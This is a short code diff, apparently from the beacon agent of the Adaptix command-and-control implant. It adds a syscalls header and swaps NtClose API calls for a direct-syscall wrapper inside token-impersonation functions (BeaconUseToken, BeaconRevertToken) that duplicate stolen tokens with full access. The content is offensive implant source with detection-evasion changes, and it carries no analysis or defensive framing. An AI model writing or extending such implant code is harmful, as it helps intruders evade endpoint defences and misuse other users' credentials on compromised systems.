@@ -1,6 +1,7 @@
 #include "adaptix.h"
 #include "utils.h"
 #include "ApiLoader.h"
+#include "Syscalls.h"
 #include "Packer.h"
 #include "Agent.h"
 #include "main.h"
@@ -292,7 +293,7 @@ BOOL BeaconUseToken(HANDLE token)
 {
 	if (ApiWin->ImpersonateLoggedOnUser(token) || ApiWin->SetThreadToken(NULL, token)) {
 		if (g_StoredToken) {
-			ApiNt->NtClose(g_StoredToken);
+			SysNtClose(g_StoredToken);
 			g_StoredToken = NULL;
 		}
 		ApiWin->DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &g_StoredToken);
@@ -305,7 +306,7 @@ void BeaconRevertToken(void)
 {
 	ApiWin->RevertToSelf();
 	if (g_StoredToken) {
-		ApiNt->NtClose(g_StoredToken);
+		SysNtClose(g_StoredToken);
 		g_StoredToken = NULL;
 	}
 }
